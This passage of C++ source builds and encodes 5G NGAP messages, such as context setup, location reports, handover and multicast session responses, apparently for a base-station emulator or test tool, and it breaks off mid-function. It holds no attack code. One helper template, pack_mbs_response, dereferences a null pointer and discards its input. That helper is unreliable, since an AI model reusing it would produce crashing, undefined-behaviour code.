static rrc_establishment_cause_e parse_rrc_establishment_cause(const std::string& value)
{
  if (value == "mo-data") {
    return rrc_establishment_cause_opts::mo_data;
  }
  if (value == "mo-signalling" || value == "mo-sig") {
    return rrc_establishment_cause_opts::mo_sig;
  }
  if (value == "emergency") {
    return rrc_establishment_cause_opts::emergency;
  }
  if (value == "mt-access") {
    return rrc_establishment_cause_opts::mt_access;
  }
  return rrc_establishment_cause_opts::mo_sig;
}

static rrc_state_e parse_rrc_state(const std::string& value)
{
  if (value == "inactive") {
    return rrc_state_opts::inactive;
  }
  return rrc_state_opts::connected;
}

static byte_buffer build_initial_ue_message(uint64_t    ran_ue_ngap_id,
                                            byte_buffer nas_pdu,
                                            std::string tac,
                                            std::string plmn,
                                            std::string rrc_establishment_cause)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_INIT_UE_MSG);

  auto& msg                    = ngap_msg.pdu.init_msg().value.init_ue_msg();
  msg->ran_ue_ngap_id         = ran_ue_ngap_id;
  msg->nas_pdu                = std::move(nas_pdu);
  msg->user_location_info     = build_user_location_info(plmn, tac);
  msg->rrc_establishment_cause = parse_rrc_establishment_cause(rrc_establishment_cause);

  return pack_ngap_message(ngap_msg, "InitialUEMessage");
}

static pdu_session_res_setup_resp_transfer_s build_pdu_session_resource_setup_response_transfer(
    const std::string& transport_layer_address, uint32_t teid, uint8_t qfi)
{
  pdu_session_res_setup_resp_transfer_s transfer = {};
  transfer.dl_qos_flow_per_tnl_info.up_transport_layer_info = build_gtp_tunnel(transport_layer_address, teid);
  associated_qos_flow_item_s qos = {};
  qos.qos_flow_id = qfi;
  transfer.dl_qos_flow_per_tnl_info.associated_qos_flow_list.push_back(qos);
  return transfer;
}

static byte_buffer build_initial_context_setup_response(uint64_t    amf_ue_ngap_id,
                                                        uint64_t    ran_ue_ngap_id,
                                                        uint16_t    pdu_session_id,
                                                        uint32_t    teid,
                                                        std::string transport_layer_address,
                                                        uint8_t     qfi)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_INIT_CONTEXT_SETUP);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.init_context_setup_resp();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->pdu_session_res_setup_list_cxt_res_present = true;

  pdu_session_res_setup_item_cxt_res_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.pdu_session_res_setup_resp_transfer =
      pack_into_pdu(build_pdu_session_resource_setup_response_transfer(transport_layer_address, teid, qfi),
                    "PDUSessionResourceSetupResponseTransfer");
  if (item.pdu_session_res_setup_resp_transfer.empty()) {
    throw std::runtime_error("Failed to pack PDUSessionResourceSetupResponseTransfer");
  }
  msg->pdu_session_res_setup_list_cxt_res.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "InitialContextSetupResponse");
}

static byte_buffer
build_ue_radio_capability_info_indication(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, byte_buffer ue_radio_capability)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UE_RADIO_CAP_INFO_IND);

  auto& msg            = ngap_msg.pdu.init_msg().value.ue_radio_cap_info_ind();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->ue_radio_cap   = std::move(ue_radio_capability);

  return pack_ngap_message(ngap_msg, "UERadioCapabilityInfoIndication");
}


static byte_buffer
build_initial_context_setup_failure(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, const std::string& cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_unsuccessful_outcome().load_info_obj(ASN1_NGAP_ID_INIT_CONTEXT_SETUP);

  auto& msg            = ngap_msg.pdu.unsuccessful_outcome().value.init_context_setup_fail();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->cause          = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "InitialContextSetupFailure");
}

static byte_buffer build_ue_context_release_complete(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_RELEASE);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.ue_context_release_complete();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;

  return pack_ngap_message(ngap_msg, "UEContextReleaseComplete");
}

static byte_buffer build_ue_context_modification_response(uint64_t    amf_ue_ngap_id,
                                                          uint64_t    ran_ue_ngap_id,
                                                          std::string rrc_state,
                                                          std::string plmn,
                                                          std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_MOD);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.ue_context_mod_resp();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->rrc_state_present = true;
  msg->rrc_state = parse_rrc_state(rrc_state);
  msg->user_location_info_present = true;
  msg->user_location_info = build_user_location_info(plmn, tac);

  return pack_ngap_message(ngap_msg, "UEContextModificationResponse");
}

static byte_buffer build_ue_context_modification_failure(uint64_t           amf_ue_ngap_id,
                                                         uint64_t           ran_ue_ngap_id,
                                                         const std::string& cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_unsuccessful_outcome().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_MOD);

  auto& msg            = ngap_msg.pdu.unsuccessful_outcome().value.ue_context_mod_fail();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->cause          = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "UEContextModificationFailure");
}

static byte_buffer build_rrc_inactive_transition_report(uint64_t    amf_ue_ngap_id,
                                                        uint64_t    ran_ue_ngap_id,
                                                        std::string rrc_state,
                                                        std::string plmn,
                                                        std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_RRC_INACTIVE_TRANSITION_REPORT);

  auto& msg            = ngap_msg.pdu.init_msg().value.rrc_inactive_transition_report();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->rrc_state      = parse_rrc_state(rrc_state);
  msg->user_location_info = build_user_location_info(plmn, tac);

  return pack_ngap_message(ngap_msg, "RRCInactiveTransitionReport");
}

static byte_buffer build_ue_context_suspend_request(uint64_t    amf_ue_ngap_id,
                                                    uint64_t    ran_ue_ngap_id,
                                                    bool        include_user_location,
                                                    std::string plmn,
                                                    std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_SUSPEND);

  auto& msg            = ngap_msg.pdu.init_msg().value.ue_context_suspend_request();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  if (include_user_location) {
    msg->user_location_info_present = true;
    msg->user_location_info = build_user_location_info(plmn, tac);
  }

  return pack_ngap_message(ngap_msg, "UEContextSuspendRequest");
}

static byte_buffer build_ue_context_resume_request(uint64_t    amf_ue_ngap_id,
                                                   uint64_t    ran_ue_ngap_id,
                                                   std::string rrc_resume_cause,
                                                   bool        include_user_location,
                                                   std::string plmn,
                                                   std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_RESUME);

  auto& msg             = ngap_msg.pdu.init_msg().value.ue_context_resume_request();
  msg->amf_ue_ngap_id  = amf_ue_ngap_id;
  msg->ran_ue_ngap_id  = ran_ue_ngap_id;
  msg->rrc_resume_cause = parse_rrc_establishment_cause(rrc_resume_cause);
  if (include_user_location) {
    msg->user_location_info_present = true;
    msg->user_location_info = build_user_location_info(plmn, tac);
  }

  return pack_ngap_message(ngap_msg, "UEContextResumeRequest");
}

static byte_buffer build_ran_cp_relocation_indication(uint64_t    ran_ue_ngap_id,
                                                      uint16_t    amf_set_id,
                                                      uint8_t     amf_pointer,
                                                      std::string five_g_tmsi_hex,
                                                      std::string plmn,
                                                      std::string tac,
                                                      uint32_t    eutra_cell_id,
                                                      uint16_t    ul_nas_mac,
                                                      uint8_t     ul_nas_count)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_RAN_CP_RELOCATION_IND);

  auto& msg = ngap_msg.pdu.init_msg().value.ran_cp_relocation_ind();
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->five_g_s_tmsi.amf_set_id.from_number(amf_set_id);
  msg->five_g_s_tmsi.amf_pointer.from_number(amf_pointer);
  msg->five_g_s_tmsi.five_g_tmsi.from_string(five_g_tmsi_hex);
  msg->eutra_cgi.plmn_id.from_string(plmn);
  msg->eutra_cgi.eutra_cell_id.from_number(eutra_cell_id);
  msg->tai.plmn_id.from_string(plmn);
  msg->tai.tac.from_string(tac);
  msg->ul_cp_security_info.ul_nas_mac.from_number(ul_nas_mac);
  msg->ul_cp_security_info.ul_nas_count.from_number(ul_nas_count);

  return pack_ngap_message(ngap_msg, "RANCPRelocationIndication");
}

static byte_buffer build_pdu_session_resource_modify_response(uint64_t amf_ue_ngap_id,
                                                              uint64_t ran_ue_ngap_id,
                                                              uint16_t pdu_session_id,
                                                              uint8_t  qfi)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_PDU_SESSION_RES_MODIFY);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.pdu_session_res_modify_resp();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->pdu_session_res_modify_list_mod_res_present = true;

  pdu_session_res_modify_resp_transfer_s transfer = {};
  qos_flow_add_or_modify_resp_item_s qos = {};
  qos.qos_flow_id = qfi;
  transfer.qos_flow_add_or_modify_resp_list.push_back(qos);

  pdu_session_res_modify_item_mod_res_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.pdu_session_res_modify_resp_transfer = pack_into_pdu(transfer, "PDUSessionResourceModifyResponseTransfer");
  if (item.pdu_session_res_modify_resp_transfer.empty()) {
    throw std::runtime_error("Failed to pack PDUSessionResourceModifyResponseTransfer");
  }
  msg->pdu_session_res_modify_list_mod_res.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "PDUSessionResourceModifyResponse");
}

static byte_buffer build_pdu_session_resource_modify_indication(uint64_t    amf_ue_ngap_id,
                                                                uint64_t    ran_ue_ngap_id,
                                                                uint16_t    pdu_session_id,
                                                                uint32_t    teid,
                                                                std::string transport_layer_address,
                                                                uint8_t     qfi)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_PDU_SESSION_RES_MODIFY_IND);

  auto& msg            = ngap_msg.pdu.init_msg().value.pdu_session_res_modify_ind();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;

  pdu_session_res_modify_ind_transfer_s transfer = {};
  transfer.dl_qos_flow_per_tnl_info.up_transport_layer_info = build_gtp_tunnel(transport_layer_address, teid);
  associated_qos_flow_item_s qos = {};
  qos.qos_flow_id = qfi;
  transfer.dl_qos_flow_per_tnl_info.associated_qos_flow_list.push_back(qos);

  pdu_session_res_modify_item_mod_ind_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.pdu_session_res_modify_ind_transfer = pack_into_pdu(transfer, "PDUSessionResourceModifyIndicationTransfer");
  if (item.pdu_session_res_modify_ind_transfer.empty()) {
    throw std::runtime_error("Failed to pack PDUSessionResourceModifyIndicationTransfer");
  }
  msg->pdu_session_res_modify_list_mod_ind.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "PDUSessionResourceModifyIndication");
}

static byte_buffer build_ue_radio_capability_check_response(uint64_t amf_ue_ngap_id,
                                                            uint64_t ran_ue_ngap_id,
                                                            bool     ims_voice_supported)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_UE_RADIO_CAP_CHECK);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.ue_radio_cap_check_resp();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->ims_voice_support_ind =
      ims_voice_supported ? ims_voice_support_ind_opts::supported : ims_voice_support_ind_opts::not_supported;

  return pack_ngap_message(ngap_msg, "UERadioCapabilityCheckResponse");
}

static event_type_e parse_location_event_type(const std::string& value)
{
  if (value == "change-of-serve-cell") {
    return event_type_opts::change_of_serve_cell;
  }
  if (value == "ue-presence-in-area-of-interest") {
    return event_type_opts::ue_presence_in_area_of_interest;
  }
  if (value == "stop-change-of-serve-cell") {
    return event_type_opts::stop_change_of_serve_cell;
  }
  if (value == "stop-ue-presence-in-area-of-interest") {
    return event_type_opts::stop_ue_presence_in_area_of_interest;
  }
  if (value == "cancel-location-report-for-the-ue") {
    return event_type_opts::cancel_location_report_for_the_ue;
  }
  return event_type_opts::direct;
}

static byte_buffer build_location_report(uint64_t    amf_ue_ngap_id,
                                         uint64_t    ran_ue_ngap_id,
                                         std::string plmn,
                                         std::string tac,
                                         std::string event_type)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_LOCATION_REPORT);

  auto& msg            = ngap_msg.pdu.init_msg().value.location_report();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->user_location_info = build_user_location_info(plmn, tac);
  msg->location_report_request_type.event_type = parse_location_event_type(event_type);
  msg->location_report_request_type.report_area = report_area_opts::cell;

  return pack_ngap_message(ngap_msg, "LocationReport");
}

static byte_buffer
build_location_reporting_failure_indication(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, const std::string& cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_LOCATION_REPORT_FAIL_IND);

  auto& msg            = ngap_msg.pdu.init_msg().value.location_report_fail_ind();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->cause          = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "LocationReportingFailureIndication");
}

static byte_buffer
build_handover_notify(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, std::string plmn, std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_HO_NOTIF);

  auto& msg            = ngap_msg.pdu.init_msg().value.ho_notify();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->user_location_info = build_user_location_info(plmn, tac);

  return pack_ngap_message(ngap_msg, "HandoverNotify");
}

static byte_buffer build_uplink_ran_status_transfer(uint64_t amf_ue_ngap_id,
                                                    uint64_t ran_ue_ngap_id,
                                                    uint8_t  drb_id,
                                                    uint32_t ul_hfn,
                                                    uint16_t ul_sn,
                                                    uint32_t dl_hfn,
                                                    uint16_t dl_sn)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UL_RAN_STATUS_TRANSFER);

  auto& msg            = ngap_msg.pdu.init_msg().value.ul_ran_status_transfer();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;

  drbs_subject_to_status_transfer_item_s item = {};
  item.drb_id = drb_id;
  auto& ul12 = item.drb_status_ul.set_drb_status_ul12();
  ul12.ul_count_value.hfn_pdcp_sn12 = ul_hfn;
  ul12.ul_count_value.pdcp_sn12 = ul_sn;
  auto& dl12 = item.drb_status_dl.set_drb_status_dl12();
  dl12.dl_count_value.hfn_pdcp_sn12 = dl_hfn;
  dl12.dl_count_value.pdcp_sn12 = dl_sn;
  msg->ran_status_transfer_transparent_container.drbs_subject_to_status_transfer_list.push_back(item);

  return pack_ngap_message(ngap_msg, "UplinkRANStatusTransfer");
}

static byte_buffer build_uplink_ran_early_status_transfer(uint64_t amf_ue_ngap_id,
                                                          uint64_t ran_ue_ngap_id,
                                                          uint8_t  drb_id,
                                                          uint32_t dl_hfn,
                                                          uint16_t dl_sn)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UL_RAN_EARLY_STATUS_TRANSFER);

  auto& msg            = ngap_msg.pdu.init_msg().value.ul_ran_early_status_transfer();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;

  auto& first_dl = msg->early_status_transfer_transparent_container.proc_stage.set_first_dl_count();
  drbs_subject_to_early_status_transfer_item_s item = {};
  item.drb_id = drb_id;
  auto& dl12 = item.first_dl_count.set_drb_status_dl12();
  dl12.dl_count_value.hfn_pdcp_sn12 = dl_hfn;
  dl12.dl_count_value.pdcp_sn12 = dl_sn;
  first_dl.drbs_subject_to_early_status_transfer.push_back(item);

  return pack_ngap_message(ngap_msg, "UplinkRANEarlyStatusTransfer");
}

static byte_buffer build_ue_radio_capability_id_mapping_response(std::string cap_id_hex, byte_buffer ue_radio_capability)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_UE_RADIO_CAP_ID_MAP);

  auto& msg = ngap_msg.pdu.successful_outcome().value.ue_radio_cap_id_map_resp();
  msg->ue_radio_cap_id.from_string(cap_id_hex);
  msg->ue_radio_cap = std::move(ue_radio_capability);

  return pack_ngap_message(ngap_msg, "UERadioCapabilityIDMappingResponse");
}

static byte_buffer build_secondary_rat_data_usage_report(uint64_t    amf_ue_ngap_id,
                                                         uint64_t    ran_ue_ngap_id,
                                                         uint16_t    pdu_session_id,
                                                         bool        include_ho_flag,
                                                         bool        include_user_location,
                                                         std::string plmn,
                                                         std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_SECONDARY_RAT_DATA_USAGE_REPORT);

  auto& msg            = ngap_msg.pdu.init_msg().value.secondary_rat_data_usage_report();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  if (include_ho_flag) {
    msg->ho_flag_present = true;
    msg->ho_flag = ho_flag_opts::ho_prep;
  }
  if (include_user_location) {
    msg->user_location_info_present = true;
    msg->user_location_info = build_user_location_info(plmn, tac);
  }

  secondary_rat_data_usage_report_transfer_s transfer = {};
  pdu_session_res_secondary_rat_usage_item_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.secondary_rat_data_usage_report_transfer = pack_into_pdu(transfer, "SecondaryRATDataUsageReportTransfer");
  if (item.secondary_rat_data_usage_report_transfer.empty()) {
    throw std::runtime_error("Failed to pack SecondaryRATDataUsageReportTransfer");
  }
  msg->pdu_session_res_secondary_rat_usage_list.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "SecondaryRATDataUsageReport");
}

static byte_buffer
build_trace_failure_indication(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, std::string trace_id_hex, std::string cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_TRACE_FAIL_IND);

  auto& msg            = ngap_msg.pdu.init_msg().value.trace_fail_ind();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->ngran_trace_id.from_string(trace_id_hex);
  msg->cause = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "TraceFailureIndication");
}

static byte_buffer build_cell_traffic_trace(uint64_t    amf_ue_ngap_id,
                                            uint64_t    ran_ue_ngap_id,
                                            std::string trace_id_hex,
                                            std::string plmn,
                                            std::string transport_layer_address,
                                            bool        privacy_immediate_mdt)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_CELL_TRAFFIC_TRACE);

  auto& msg            = ngap_msg.pdu.init_msg().value.cell_traffic_trace();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->ngran_trace_id.from_string(trace_id_hex);
  auto& nr_cgi = msg->ngran_cgi.set_nr_cgi();
  nr_cgi.plmn_id.from_string(plmn);
  nr_cgi.nr_cell_id.from_number(
      nr_cell_identity::create(gnb_id_t{current_gnb_id, default_gnb_id_bit_len}, default_sector_id).value().value());
  msg->trace_collection_entity_ip_address.from_string(ipv4_to_bit_string(transport_layer_address));
  msg->privacy_ind_present = true;
  msg->privacy_ind = privacy_immediate_mdt ? privacy_ind_opts::immediate_mdt : privacy_ind_opts::logged_mdt;

  return pack_ngap_message(ngap_msg, "CellTrafficTrace");
}

static std::string join_strings(const std::vector<std::string>& values, const char* separator)
{
  std::string result;
  for (unsigned i = 0; i != values.size(); ++i) {
    if (i != 0) {
      result += separator;
    }
    result += values[i];
  }
  return result;
}

static mbs_session_id_s build_default_mbs_session_id(const std::string& tmgi_hex)
{
  mbs_session_id_s id = {};
  id.tmgi.from_string(tmgi_hex);
  return id;
}

static byte_buffer build_connection_establishment_indication(uint64_t amf_id, uint64_t ran_id)
{
  ngap_message m = {};
  m.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_CONN_ESTABLISHMENT_IND);
  auto& msg = m.pdu.init_msg().value.conn_establishment_ind();
  msg->amf_ue_ngap_id = amf_id;
  msg->ran_ue_ngap_id = ran_id;
  return pack_ngap_message(m, "ConnectionEstablishmentIndication");
}

static byte_buffer build_ue_context_suspend_response(uint64_t amf_id, uint64_t ran_id)
{
  ngap_message m = {};
  m.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_SUSPEND);
  auto& msg = m.pdu.successful_outcome().value.ue_context_suspend_resp();
  msg->amf_ue_ngap_id = amf_id;
  msg->ran_ue_ngap_id = ran_id;
  return pack_ngap_message(m, "UEContextSuspendResponse");
}

static byte_buffer build_ue_context_resume_response(uint64_t amf_id, uint64_t ran_id)
{
  ngap_message m = {};
  m.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_RESUME);
  auto& msg = m.pdu.successful_outcome().value.ue_context_resume_resp();
  msg->amf_ue_ngap_id = amf_id;
  msg->ran_ue_ngap_id = ran_id;
  return pack_ngap_message(m, "UEContextResumeResponse");
}

static byte_buffer build_reroute_nas_request(uint64_t ran_id, uint64_t amf_id, byte_buffer ngap_msg)
{
  ngap_message m = {};
  m.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_REROUTE_NAS_REQUEST);
  auto& msg = m.pdu.init_msg().value.reroute_nas_request();
  msg->ran_ue_ngap_id = ran_id;
  msg->amf_ue_ngap_id_present = true;
  msg->amf_ue_ngap_id = amf_id;
  msg->ngap_msg = std::move(ngap_msg);
  msg->amf_set_id.from_number(0);
  return pack_ngap_message(m, "RerouteNASRequest");
}

static byte_buffer build_ue_information_transfer(const std::string& amf_set_id_hex,
                                                  const std::string& amf_pointer_hex,
                                                  const std::string& five_g_tmsi_hex)
{
  ngap_message m = {};
  m.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UE_INFO_TRANSFER);
  auto& msg = m.pdu.init_msg().value.ue_info_transfer();
  msg->five_g_s_tmsi.amf_set_id.from_string(amf_set_id_hex);
  msg->five_g_s_tmsi.amf_pointer.from_string(amf_pointer_hex);
  msg->five_g_s_tmsi.five_g_tmsi.from_string(five_g_tmsi_hex);
  return pack_ngap_message(m, "UEInformationTransfer");
}

template<typename Response>
static byte_buffer pack_mbs_response(Response& msg, const char* name, const mbs_session_id_s& session_id)
{
  msg->mbs_session_id = session_id;
  return pack_ngap_message(*reinterpret_cast<ngap_message*>(nullptr), name);
}

static byte_buffer build_broadcast_session_modification_response(const std::string& tmgi_hex, byte_buffer transfer)
{
  ngap_message m = {};
  m.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_BROADCAST_SESSION_MOD);
  auto& msg = m.pdu.successful_outcome().value.broadcast_session_mod_resp();
  msg->mbs_session_id = build_default_mbs_session_id(tmgi_hex);
  msg->mbs_session_mod_resp_transfer_present = true;
  msg->mbs_session_mod_resp_transfer = std::move(transfer);
  return pack_ngap_message(m, "BroadcastSessionModificationResponse");
}

static byte_buffer build_broadcast_session_release_response(const std::string& tmgi_hex, byte_buffer transfer)
{
  ngap_message m = {};
  m.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_BROADCAST_SESSION_RELEASE);
  auto& msg = m.pdu.successful_outcome().value.broadcast_session_release_resp();
  msg->mbs_session_id = build_default_mbs_session_id(tmgi_hex);
  msg->mbs_session_release_resp_transfer_present = true;
  msg->mbs_session_release_resp_transfer = std::move(transfer);
  return pack_ngap_message(m, "BroadcastSessionReleaseResponse");
}

static byte_buffer build_broadcast_session_setup_response(const std::string& tmgi_hex, byte_buffer transfer)
{
  ngap_message m = {};
  m.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_BROADCAST_SESSION_SETUP);
  auto& msg = m.pdu.successful_outcome().value.broadcast_session_setup_resp();
  msg->mbs_session_id = build_default_mbs_session_id(tmgi_hex);
  msg->mbs_session_setup_resp_transfer_present = true;
  msg->mbs_session_setup_resp_transfer = std::move(transfer);
  return pack_ngap_message(m, "BroadcastSessionSetupResponse");
}

static byte_buffer build_broadcast_session_transport_response(const std::string& tmgi_hex, byte_buffer transfer)
{
  ngap_message m = {};
  m.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_BROADCAST_SESSION_TRANSPORT);
  auto& msg = m.pdu.successful_outcome().value.broadcast_session_transport_resp();
  msg->mbs_session_id = build_default_mbs_session_id(tmgi_hex);
  msg->broadcast_transport_resp_transfer = std::move(transfer);
  return pack_ngap_message(m, "BroadcastSessionTransportResponse");
}

static byte_buffer build_distribution_setup_response(const std::string& tmgi_hex, uint32_t area_id, byte_buffer transfer)
{
  ngap_message m = {};
  m.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_DISTRIBUTION_SETUP);
  auto& msg = m.pdu.successful_outcome().value.distribution_setup_resp();
  msg->mbs_session_id = build_default_mbs_session_id(tmgi_hex);
  msg->mbs_area_session_id_present = true;
  msg->mbs_area_session_id = area_id;
  msg->mbs_distribution_setup_resp_transfer = std::move(transfer);
  return pack_ngap_message(m, "DistributionSetupResponse");
}

static byte_buffer build_distribution_release_response(const std::string& tmgi_hex, uint32_t area_id)
{
  ngap_message m = {};
  m.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_DISTRIBUTION_RELEASE);
  auto& msg = m.pdu.successful_outcome().value.distribution_release_resp();
  msg->mbs_session_id = build_default_mbs_session_id(tmgi_hex);
  msg->mbs_area_session_id_present = true;
  msg->mbs_area_session_id = area_id;
  return pack_ngap_message(m, "DistributionReleaseResponse");
}

static byte_buffer build_multicast_session_activation_response(const std::string& tmgi_hex)
{
  ngap_message m = {};
  m.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_MULTICAST_SESSION_ACTIVATION);
  auto& msg = m.pdu.successful_outcome().value.multicast_session_activation_resp();
  msg->mbs_session_id = build_default_mbs_session_id(tmgi_hex);
  return pack_ngap_message(m, "MulticastSessionActivationResponse");
}

static byte_buffer build_multicast_session_deactivation_response(const std::string& tmgi_hex)
{
  ngap_message m = {};
  m.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_MULTICAST_SESSION_DEACTIVATION);
  auto& msg = m.pdu.successful_outcome().value.multicast_session_deactivation_resp();
  msg->mbs_session_id = build_default_mbs_session_id(tmgi_hex);
  return pack_ngap_message(m, "MulticastSessionDeactivationResponse");
}

static byte_buffer build_multicast_session_update_response(const std::string& tmgi_hex, uint32_t area_id)
{
  ngap_message m = {};
  m.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_MULTICAST_SESSION_UPD);
  auto& msg = m.pdu.successful_outcome().value.multicast_session_upd_resp();
  msg->mbs_session_id = build_default_mbs_session_id(tmgi_hex);
  msg->mbs_area_session_id_present = true;
  msg->mbs_area_session_id = area_id;
  return pack_ngap_message(m, "MulticastSessionUpdateResponse");
}

static byte_buffer build_timing_synchronisation_status_response(byte_buffer routing_id)
{
  ngap_message m = {};
  m.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_TIMING_SYNCHRONISATION_STATUS);
  auto& msg = m.pdu.successful_outcome().value.timing_synchronisation_status_resp();
  msg->routing_id = std::move(routing_id);
  return pack_ngap_message(m, "TimingSynchronisationStatusResponse");
}

static byte_buffer build_handover_success(uint64_t amf_id, uint64_t ran_id)
{
  ngap_message m = {};
  m.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_HO_SUCCESS);
  auto& msg = m.pdu.init_msg().value.ho_success();
  msg->amf_ue_ngap_id = amf_id;
  msg->ran_ue_ngap_id = ran_id;
  return pack_ngap_message(m, "HandoverSuccess");
}

static byte_buffer build_uplink_ran_configuration_transfer(byte_buffer transfer)
{
